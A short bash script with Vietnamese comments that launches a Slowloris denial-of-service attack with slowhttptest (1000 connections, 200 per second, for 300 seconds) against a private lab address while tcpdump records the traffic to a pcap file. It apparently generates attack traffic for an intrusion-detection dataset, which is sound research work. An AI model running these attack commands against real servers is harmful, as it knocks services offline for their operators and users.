#!/bin/bash
# Kich ban tan cong Slowloris
VICTIM="10.0.2.10"
DURATION=300

echo "Bat dau Slowloris vao $VICTIM trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# 1. Bat tcpdump ghi lai traffic
tcpdump -i s2-eth99 -w datasets/s07_slowloris.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

# 2. Chay Slowhttptest
# -c 1000: 1000 ket noi | -H: che do Slowloris | -i 10: gui du lieu moi 10s
# -r 200: 200 ket noi/giay | -t GET | -p 3: timeout 3s | -l: thoi gian chay
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://$VICTIM/ -p 3 -l $DURATION &
SLOW_PID=$!

# 3. Cho het thoi gian
sleep $DURATION
kill $TCPDUMP_PID $SLOW_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat kich ban Slowloris!"